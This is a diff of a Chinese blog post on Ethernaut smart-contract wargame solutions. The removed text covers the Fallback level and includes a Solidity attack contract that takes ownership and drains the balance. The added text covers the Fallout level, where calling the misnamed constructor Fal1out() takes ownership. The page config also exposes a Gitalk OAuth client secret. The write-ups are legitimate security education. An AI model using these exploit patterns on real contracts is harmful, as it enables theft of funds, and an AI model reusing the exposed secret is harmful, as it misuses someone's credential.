@@ -16,15 +16,15 @@
   <meta name="author" content="ysh0566">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Fallback目标: 获取合约的owner权限, 并将合约余额减到0 123456789101112131415161718192021222324252627282930313233343536373839404142434445&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &amp;#x27;@openzeppelin&#x2F;co">
+    <meta name="description" content="Fallout目标: 获取合约的owner权限 12345678910111213141516171819202122232425262728293031323334353637383940414243&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &amp;#x27;https:&#x2F;&#x2F;github.com&#x2F;OpenZeppelin&#x2F;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Ethernaut题解-01.Fallback">
-<meta property="og:url" content="https://blog.ysh0566.top/2022/06/15/Ethernaut%E9%A2%98%E8%A7%A3-01-Fallback/index.html">
+<meta property="og:title" content="Ethernaut题解-02.Fallout">
+<meta property="og:url" content="https://blog.ysh0566.top/2022/06/16/Ethernaut%E9%A2%98%E8%A7%A3-02-Fallout/index.html">
 <meta property="og:site_name" content="ysh0566&#39;s blog">
-<meta property="og:description" content="Fallback目标: 获取合约的owner权限, 并将合约余额减到0 123456789101112131415161718192021222324252627282930313233343536373839404142434445&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &amp;#x27;@openzeppelin&#x2F;co">
+<meta property="og:description" content="Fallout目标: 获取合约的owner权限 12345678910111213141516171819202122232425262728293031323334353637383940414243&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &amp;#x27;https:&#x2F;&#x2F;github.com&#x2F;OpenZeppelin&#x2F;">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-06-15T15:35:50.000Z">
-<meta property="article:modified_time" content="2022-06-16T06:04:45.610Z">
+<meta property="article:published_time" content="2022-06-16T06:06:16.000Z">
+<meta property="article:modified_time" content="2022-06-16T08:43:08.025Z">
 <meta property="article:author" content="ysh0566">
 <meta property="article:tag" content="Solidity">
 <meta property="article:tag" content="Ethernaut">
@@ -35,7 +35,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Ethernaut题解-01.Fallback - ysh0566&#39;s blog</title>
+  <title>Ethernaut题解-02.Fallout - ysh0566&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -198,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Ethernaut题解-01.Fallback"></span>
+            <span id="subtitle" data-typed-text="Ethernaut题解-02.Fallout"></span>
           
         </div>
 
@@ -209,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-06-15 23:35" pubdate>
-          2022年6月15日 晚上
+        <time datetime="2022-06-16 14:06" pubdate>
+          2022年6月16日 下午
         </time>
       </span>
     
@@ -221,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          1.1k 字
         
       </span>
     
@@ -232,7 +232,7 @@
         
         
         
-          18 分钟
+          10 分钟
         
       </span>
     
@@ -270,21 +270,14 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Ethernaut题解-01.Fallback</h1>
+            <h1 style="display: none">Ethernaut题解-02.Fallout</h1>
             
             <div class="markdown-body">
               
-              <h3 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h3><p>目标: 获取合约的owner权限, 并将合约余额减到0</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">// SPDX-License-Identifier: MIT<br>pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;<br><br>contract Fallback &#123;<br><br>  <span class="hljs-keyword">using</span> SafeMath <span class="hljs-keyword">for</span> uint256;<br>  <span class="hljs-keyword">mapping</span>(address =&gt; uint) <span class="hljs-built_in">public</span> contributions;<br>  address payable <span class="hljs-built_in">public</span> <span class="hljs-keyword">owner</span>;<br><br>  constructor() <span class="hljs-built_in">public</span> &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = <span class="hljs-number">1000</span> * (<span class="hljs-number">1</span> ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == <span class="hljs-keyword">owner</span>,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  <span class="hljs-keyword">function</span> contribute() <span class="hljs-built_in">public</span> payable &#123;<br>    require(msg.<span class="hljs-keyword">value</span> &lt; <span class="hljs-number">0.001</span> ether);<br>    contributions[msg.sender] += msg.<span class="hljs-keyword">value</span>;<br>    <span class="hljs-keyword">if</span>(contributions[msg.sender] &gt; contributions[<span class="hljs-keyword">owner</span>]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> getContribution() <span class="hljs-built_in">public</span> <span class="hljs-keyword">view</span> <span class="hljs-keyword">returns</span> (uint) &#123;<br>    <span class="hljs-keyword">return</span> contributions[msg.sender];<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> withdraw() <span class="hljs-built_in">public</span> onlyOwner &#123;<br>    <span class="hljs-keyword">owner</span>.transfer(address(this).balance);<br>  &#125;<br><br>  receive() <span class="hljs-keyword">external</span> payable &#123;<br>    require(msg.<span class="hljs-keyword">value</span> &gt; <span class="hljs-number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="hljs-number">0</span>); // 满足该条件即可获得<span class="hljs-keyword">owner</span>权限<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>解题思路就是获取owner权限后, 调用withdraw方法使合约余额减到0.</p>
-<p>最核心的是先获取owner权限, 需要先调用<code>contribute()</code>同时发送一些eth使<code>contributions[msg.sender] &gt; 0</code>条件满足, 然后再向合约转账即可取得owner权限. </p>
-<p>用到的知识点是: 当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发, 该函数不能有参数和返回值，需设置为external，payable.</p>
-<p>达成该功能还可以使用fallback方法, 当本合约的其他函数不匹配调用，或调用者未提供任何信息，且没有receive函数，fallback函数被触发.</p>
-<p>具体文档可见<a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.15/contracts.html#receive-ether-function">官方文档</a>.</p>
-<h3 id="合约代码题解"><a href="#合约代码题解" class="headerlink" title="合约代码题解"></a>合约代码题解</h3><p><a target="_blank" rel="noopener" href="https://rinkeby.etherscan.io/address/0x3431d6a8E51a5De2D75405240F615aF5B3837826">FallbackSolution合约地址</a></p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity <span class="hljs-number">0.8</span>.<span class="hljs-number">4</span>;<br><br>interface Fallback &#123;<br>    <span class="hljs-keyword">function</span> withdraw<span class="hljs-literal">()</span> <span class="hljs-keyword">external</span>;<br>    <span class="hljs-keyword">function</span> contribute<span class="hljs-literal">()</span> <span class="hljs-keyword">external</span> payable;<br>&#125;<br><br>contract FallbackSolution &#123;<br><br>    constructor<span class="hljs-literal">()</span> payable &#123; <br><br>    &#125;<br><br>    <span class="hljs-keyword">function</span> run(address payable _fallback) public payable &#123;<br>        require(address(this).balance &gt;= <span class="hljs-number">0.0001</span> ether);<br>        <span class="hljs-constructor">Fallback(<span class="hljs-params">_fallback</span>)</span>.contribute&#123;value: <span class="hljs-number">0.00005</span> ether&#125;<span class="hljs-literal">()</span>;<br>        (<span class="hljs-built_in">bool</span> success, ) = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_fallback</span>.</span></span>call&#123;value: <span class="hljs-number">0.00005</span> ether&#125;(<span class="hljs-string">&quot;&quot;</span>); <span class="hljs-comment">//谨慎使用transfer和send方法转出到合约, gas可能会超出限制.</span><br>        require(success, <span class="hljs-string">&quot;transfer failed&quot;</span>);<br>        <span class="hljs-constructor">Fallback(<span class="hljs-params">_fallback</span>)</span>.withdraw<span class="hljs-literal">()</span>;<br>    &#125;<br><br>    receive<span class="hljs-literal">()</span> payable <span class="hljs-keyword">external</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>最后可惜,合约获取到owner权限并不满足最后检查条件,用玩家账号手动执行可以通过检查.</p>
-
+              <h3 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h3><p>目标: 获取合约的owner权限</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">// SPDX-License-Identifier: MIT<br>pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol&#x27;</span>;<br><br>contract Fallout &#123;<br>  <br>  <span class="hljs-keyword">using</span> SafeMath <span class="hljs-keyword">for</span> uint256;<br>  <span class="hljs-keyword">mapping</span> (address =&gt; uint) allocations;<br>  address payable <span class="hljs-built_in">public</span> <span class="hljs-keyword">owner</span>;<br><br><br>  <span class="hljs-comment">/* constructor */</span><br>  <span class="hljs-keyword">function</span> Fal1out() <span class="hljs-built_in">public</span> payable &#123;<br>    owner = msg.sender;<br>    allocations[<span class="hljs-keyword">owner</span>] = msg.<span class="hljs-keyword">value</span>;<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>	        require(<br>	            msg.sender == <span class="hljs-keyword">owner</span>,<br>	            &quot;caller is not the owner&quot;<br>	        );<br>	        _;<br>	    &#125;<br><br>  <span class="hljs-keyword">function</span> allocate() <span class="hljs-built_in">public</span> payable &#123;<br>    allocations[msg.sender] = allocations[msg.sender].<span class="hljs-keyword">add</span>(msg.<span class="hljs-keyword">value</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> sendAllocation(address payable allocator) <span class="hljs-built_in">public</span> &#123;<br>    require(allocations[allocator] &gt; <span class="hljs-number">0</span>);<br>    allocator.transfer(allocations[allocator]);<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> collectAllocations() <span class="hljs-built_in">public</span> onlyOwner &#123;<br>    msg.sender.transfer(address(this).balance);<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> allocatorBalance(address allocator) <span class="hljs-built_in">public</span> <span class="hljs-keyword">view</span> <span class="hljs-keyword">returns</span> (uint) &#123;<br>    <span class="hljs-keyword">return</span> allocations[allocator];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>这题构造方法写的有问题, 直接调用Fal1out方法就可以获取owner权限.<br>网页控制台执行:</p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">contract.Fal<span class="hljs-number">1</span><span class="hljs-keyword">out</span>()<br></code></pre></td></tr></table></figure>
               
             </div>
             <hr/>
@@ -332,8 +325,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Ethernaut题解-01.Fallback</div>
-      <div>https://blog.ysh0566.top/2022/06/15/Ethernaut题解-01-Fallback/</div>
+      <div>Ethernaut题解-02.Fallout</div>
+      <div>https://blog.ysh0566.top/2022/06/16/Ethernaut题解-02-Fallout/</div>
     </div>
     <div class="license-meta">
       
@@ -345,7 +338,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年6月15日</div>
+          <div>2022年6月16日</div>
         </div>
       
       
@@ -375,15 +368,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/06/16/Ethernaut%E9%A2%98%E8%A7%A3-02-Fallout/" title="Ethernaut题解-02.Fallout">
+                      <a href="/2022/06/16/Ethernaut%E9%A2%98%E8%A7%A3-03-Coin-Flip/" title="Ethernaut题解-03-Coin Flip">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Ethernaut题解-02.Fallout</span>
+                        <span class="hidden-mobile">Ethernaut题解-03-Coin Flip</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2022/06/15/Ethernaut%E9%A2%98%E8%A7%A3-01-Fallback/" title="Ethernaut题解-01.Fallback">
+                        <span class="hidden-mobile">Ethernaut题解-01.Fallback</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
@@ -401,7 +400,7 @@
         var options = Object.assign(
           {"clientID":"910b673618e1f98d3bfe","clientSecret":"e2df81a04bfeb61360bb8960ff5a50435ac54ec9","repo":"ysh0566.github.io","owner":"ysh0566","admin":["ysh0566"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
           {
-            id: '0a5f84f76463f42b570136bc7fd8389b'
+            id: 'a86ac4fa681a54d83ac420d4552eb435'
           }
         )
         var gitalk = new Gitalk(options);
